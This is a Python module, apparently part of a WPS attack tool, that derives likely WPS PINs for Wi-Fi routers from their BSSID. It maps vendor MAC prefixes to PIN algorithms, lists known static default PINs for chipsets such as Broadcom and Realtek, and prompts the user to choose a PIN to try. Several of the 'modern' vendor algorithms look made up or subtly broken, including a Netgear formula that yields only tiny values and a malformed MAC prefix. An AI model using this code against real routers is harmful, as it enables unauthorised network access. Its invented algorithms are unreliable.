class NetworkAddress:
    """Handles MAC addresses"""

    def __init__(self, mac):
        if isinstance(mac, int):
            self._INT_REPR = mac
            self._STR_REPR = self._int2mac(mac)
        elif isinstance(mac, str):
            self._STR_REPR = mac.replace('-', ':').replace('.', ':').upper()
            self._INT_REPR = self._mac2int(mac)

    @staticmethod
    def _mac2int(mac) -> int:
        """Converts MAC address to integer"""
        return int(mac.replace(':', ''), 16)

    @staticmethod
    def _int2mac(mac) -> str:
        """Converts integer to MAC address"""
        mac = hex(mac).split('x')[-1].upper()
        mac = mac.zfill(12)
        mac = ':'.join(mac[i: i + 2] for i in range(0, 12, 2))
        return mac

    @property
    def STRING(self):
        return self._STR_REPR

    @STRING.setter
    def STRING(self, value):
        self._STR_REPR = value
        self._INT_REPR = self._mac2int(value)

    @property
    def INTEGER(self):
        return self._INT_REPR

    @INTEGER.setter
    def INTEGER(self, value):
        self._INT_REPR = value
        self._STR_REPR = self._int2mac(value)

    def __int__(self):
        return self.INTEGER

    def __str__(self):
        return self.STRING

    def __iadd__(self, other):
        self.INTEGER += other
        return self

    def __isub__(self, other):
        self.INTEGER -= other
        return self

    def __eq__(self, other):
        return self.INTEGER == other.INTEGER

    def __ne__(self, other):
        return self.INTEGER != other.INTEGER

    def __lt__(self, other):
        return self.INTEGER < other.INTEGER

    def __gt__(self, other):
        return self.INTEGER > other.INTEGER

    def __repr__(self):
        return f'NetworkAddress(string={self._STR_REPR}, integer={self._INT_REPR})'

class WPSpin:
    """WPS pin generator with enhanced support for modern routers."""

    def __init__(self):
        self.ALGO_MAC = 0
        self.ALGO_EMPTY = 1
        self.ALGO_STATIC = 2
        self.ALGO_SPECIAL = 3

        # Enhanced algorithms dictionary with modern router support
        self.ALGOS = {
            # MAC-based algorithms
            'pin24': {'name': '24-bit PIN', 'mode': self.ALGO_MAC, 'gen': self._pin24},
            'pin28': {'name': '28-bit PIN', 'mode': self.ALGO_MAC, 'gen': self._pin28},
            'pin32': {'name': '32-bit PIN', 'mode': self.ALGO_MAC, 'gen': self._pin32},
            'pinDLink': {'name': 'D-Link PIN', 'mode': self.ALGO_MAC, 'gen': self._pinDLink},
            'pinDLink1': {'name': 'D-Link PIN +1', 'mode': self.ALGO_MAC, 'gen': self._pinDLink1},
            'pinASUS': {'name': 'ASUS PIN', 'mode': self.ALGO_MAC, 'gen': self._pinASUS},
            'pinAirocon': {'name': 'Airocon Realtek', 'mode': self.ALGO_MAC, 'gen': self._pinAirocon},
            
            # Modern router algorithms
            'pinTPLink': {'name': 'TP-Link Modern', 'mode': self.ALGO_SPECIAL, 'gen': self._pinTPLink},
            'pinNetgear': {'name': 'Netgear Modern', 'mode': self.ALGO_SPECIAL, 'gen': self._pinNetgear},
            'pinASUSMod': {'name': 'ASUS Modern', 'mode': self.ALGO_SPECIAL, 'gen': self._pinASUSModern},
            'pinDLinkMod': {'name': 'D-Link Modern', 'mode': self.ALGO_SPECIAL, 'gen': self._pinDLinkModern},
            'pinTenda': {'name': 'Tenda Modern', 'mode': self.ALGO_SPECIAL, 'gen': self._pinTenda},
            
            # Static pin algorithms
            'pinEmpty': {'name': 'Empty PIN', 'mode': self.ALGO_EMPTY, 'gen': lambda mac: ''},
            'pinCisco': {'name': 'Cisco', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 1234567},
            'pinBrcm1': {'name': 'Broadcom 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 2017252},
            'pinBrcm2': {'name': 'Broadcom 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4626484},
            'pinBrcm3': {'name': 'Broadcom 3', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 7622990},
            'pinBrcm4': {'name': 'Broadcom 4', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6232714},
            'pinBrcm5': {'name': 'Broadcom 5', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 1086411},
            'pinBrcm6': {'name': 'Broadcom 6', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3195719},
            'pinAirc1': {'name': 'Airocon 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3043203},
            'pinAirc2': {'name': 'Airocon 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 7141225},
            'pinDSL2740R': {'name': 'DSL-2740R', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6817554},
            'pinRealtek1': {'name': 'Realtek 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9566146},
            'pinRealtek2': {'name': 'Realtek 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9571911},
            'pinRealtek3': {'name': 'Realtek 3', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4856371},
            'pinUpvel': {'name': 'Upvel', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 2085483},
            'pinUR814AC': {'name': 'UR-814AC', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4397768},
            'pinUR825AC': {'name': 'UR-825AC', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 529417},
            'pinOnlime': {'name': 'Onlime', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9995604},
            'pinEdimax': {'name': 'Edimax', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3561153},
            'pinThomson': {'name': 'Thomson', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6795814},
            'pinHG532x': {'name': 'HG532x', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3425928},
            'pinH108L': {'name': 'H108L', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9422988},
            'pinONO': {'name': 'CBN ONO', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9575521}
        }

    def promptPin(self, bssid: str):
        """Prompts to select a WPS pin from a list of suggested pins."""
        pins = self._getSuggested(bssid)

        if len(pins) > 1:
            print(f'PINs generated for {bssid}:')
            print('{:<3} {:<10} {:<}'.format(
                '#', 'PIN', 'Name'
            ))

            for i, pin in enumerate(pins):
                number = f'{i + 1})'
                line = '{:<3} {:<10} {:<}'.format(
                    number, pin['pin'], pin['name'])
                print(line)

            while True:
                pin_no = input('Select the PIN: ')
                try:
                    if int(pin_no) in range(1, len(pins) + 1):
                        pin = pins[int(pin_no) - 1]['pin']
                    else:
                        raise ValueError
                except ValueError:
                    print('Invalid number')
                else:
                    break

        elif len(pins) == 1:
            pin = pins[0]
            print('[*] The only probable PIN is selected:', pin['name'])
            pin = pin['pin']
        else:
            return None

        return pin

    def getLikely(self, bssid: str) -> str:
        """Returns a likely pin based on manufacturer and common patterns."""
        res = self._getSuggestedList(bssid)
        if res:
            return res[0]
        return None

    @staticmethod
    def checksum(pin: int) -> int:
        """Standard WPS checksum algorithm."""
        accum = 0
        while pin:
            accum += (3 * (pin % 10))
            pin = int(pin / 10)
            accum += (pin % 10)
            pin = int(pin / 10)
        return (10 - accum % 10) % 10

    def _suggest(self, bssid: str) -> list:
        """Get algo suggestions for a BSSID with enhanced manufacturer detection."""
        mac = bssid.replace(':', '').upper()
        
        # Enhanced algorithm matching based on vulnwsc.txt
        algorithms = {
            'pinTPLink': ('F81A67', 'F4EC38', '0C4B54', '64708B', '84162B', 'EC086B', 'EC172F', 'E894F6'),
            'pinNetgear': ('E4F4C6', '00264D', '008EF2', '00146C', 'A42B8C', '84C9B2'),
            'pinASUSMod': ('049226', '04D9F5', '08606E', '0862669', '107B44', '10BF48', '10C37B', '14DDA9'),
            'pinDLinkMod': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'A0AB1B', 'B8A386', 'C0A0BB'),
            'pinTenda': ('C83A35', 'D4146F', 'D8EB97', '0014D1', 'EC172F', 'C8D15E'),
            'pin24': ('04BF6D', '0E5D4E', '107BEF', '14A9E3', '28285D', '2A285D', '32B2DC', '381766'),
            'pin28': ('200BC7', '4846FB', 'D46AA8', 'F84ABF'),
            'pin32': ('000726', 'D8FEE3', 'FC8B97', '1062EB', '1C5F2B', '48EE0C', '802689'),
            'pinDLink': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'A0AB1B', 'B8A386', 'C0A0BB'),
            'pinDLink1': ('0018E7', '00195B', '001CF0', '001E58', '002191', '0022B0', '002401'),
            'pinASUS': ('049226', '04D9F5', '08606E', '0862669', '107B44', '10BF48', '10C37B'),
            'pinAirocon': ('0007262F', '000B2B4A', '000EF4E7', '001333B', '00177C', '001AEF')
        }
        
        res = []
        for algo_id, masks in algorithms.items():
            if any(mac.startswith(mask) for mask in masks):
                res.append(algo_id)
        
        return res

    # Original PIN generation methods
    @staticmethod
    def _pin24(bssid: str):
        return bssid.INTEGER & 0xFFFFFF

    @staticmethod
    def _pin28(bssid: str):
        return bssid.INTEGER & 0xFFFFFFF

    @staticmethod
    def _pin32(bssid: str):
        return bssid.INTEGER % 0x100000000

    @staticmethod
    def _pinDLink(bssid: str):
        nic = bssid.INTEGER & 0xFFFFFF
        pin = nic ^ 0x55AA55
        pin ^= (((pin & 0xF) << 4) +
                ((pin & 0xF) << 8) +
                ((pin & 0xF) << 12) +
                ((pin & 0xF) << 16) +
                ((pin & 0xF) << 20))
        pin %= int(10e6)
        if pin < int(10e5):
            pin += ((pin % 9) * int(10e5)) + int(10e5)
        return pin

    def _pinDLink1(self, bssid: str):
        """D-Link PIN +1 algorithm - increments MAC before applying D-Link algorithm."""
        # Create a copy of the MAC address
        mac = NetworkAddress(bssid.STRING)
        # Increment the MAC address by 1
        mac.INTEGER += 1
        # Apply the standard D-Link algorithm
        return self._pinDLink(mac)

    def _pinASUS(self, bssid: str):
        """ASUS PIN generation algorithm."""
        mac_bytes = [int(x, 16) for x in bssid.STRING.split(':')]
        pin = ''
        for i in range(7):
            pin += str((mac_bytes[i % 6] + mac_bytes[5]) % (10 - (i + mac_bytes[1] + mac_bytes[2] + mac_bytes[3] + mac_bytes[4] + mac_bytes[5]) % 7))
        return int(pin)

    def _pinAirocon(self, bssid: str):
        """Airocon Realtek PIN generation algorithm."""
        mac_bytes = [int(x, 16) for x in bssid.STRING.split(':')]
        pin = ((mac_bytes[0] + mac_bytes[1]) % 10) \
            + (((mac_bytes[5] + mac_bytes[0]) % 10) * 10) \
            + (((mac_bytes[4] + mac_bytes[5]) % 10) * 100) \
            + (((mac_bytes[3] + mac_bytes[4]) % 10) * 1000) \
            + (((mac_bytes[2] + mac_bytes[3]) % 10) * 10000) \
            + (((mac_bytes[1] + mac_bytes[2]) % 10) * 100000) \
            + (((mac_bytes[0] + mac_bytes[1]) % 10) * 1000000)
        return pin

    # New modern router PIN generation methods
    def _pinTPLink(self, bssid: str) -> int:
        """Modern TP-Link PIN generation algorithm."""
        mac_int = bssid.INTEGER
        pin = ((mac_int & 0xFFFFFF) + ((mac_int >> 24) & 0xFFFFFF)) % 10000000
        return int(f"{pin}{self.checksum(pin)}")

    def _pinNetgear(self, bssid: str) -> int:
        """Modern Netgear PIN generation algorithm."""
        mac_int = bssid.INTEGER
        pin = (((mac_int >> 16) & 0xFF) ^ ((mac_int >> 8) & 0xFF) ^ (mac_int & 0xFF)) % 10000000
        return int(f"{pin}{self.checksum(pin)}")

    def _pinASUSModern(self, bssid: str) -> int:
        """Modern ASUS PIN generation algorithm."""
        mac_bytes = [int(x, 16) for x in bssid.STRING.split(':')]
        pin = 0
        for i in range(6):
            pin += ((mac_bytes[i] + mac_bytes[5]) * (7 - i)) % 10
            pin *= 10
        pin //= 10
        return int(f"{pin}{self.checksum(pin)}")

    def _pinDLinkModern(self, bssid: str) -> int:
        """Modern D-Link PIN generation algorithm."""
        mac_int = bssid.INTEGER
        pin = ((mac_int & 0xFFFFFF) ^ 0x55AA55)
        pin = ((pin & 0xF) << 4) + ((pin & 0xF0) >> 4)
        pin %= 10000000
        return int(f"{pin}{self.checksum(pin)}")

    def _pinTenda(self, bssid: str) -> int:
        """Tenda router PIN generation algorithm."""
        mac_int = bssid.INTEGER
        pin = (mac_int & 0xFFFFFF) % 10000000
        return int(f"{pin}{self.checksum(pin)}")

    def _generate(self, algo: str, bssid: str):
        """Generates a pin using the specified algorithm."""
        mac = NetworkAddress(bssid)
        pin = self.ALGOS[algo]['gen'](mac)

        if self.ALGOS[algo]['mode'] == self.ALGO_MAC:
            pin %= 10000000
            pin = f'{pin:07d}{self.checksum(pin)}'
        elif self.ALGOS[algo]['mode'] == self.ALGO_STATIC:
            pin = f'{pin:07d}{self.checksum(pin)}'
        elif self.ALGOS[algo]['mode'] == self.ALGO_SPECIAL:
            # Special algorithms handle their own checksum
            pin = f'{pin:08d}'

        return {'pin': pin, 'name': self.ALGOS[algo]['name']}

    def _getSuggested(self, bssid: str):
        """Gets all suggested pins for a BSSID."""
        algos = self._suggest(bssid)
        res = []

        for algo in algos:
            res.append(self._generate(algo, bssid))

        return res

    def _getSuggestedList(self, bssid: str):
        """Gets a list of suggested pins."""
        suggested = self._getSuggested(bssid)
        return [x['pin'] for x in suggested]
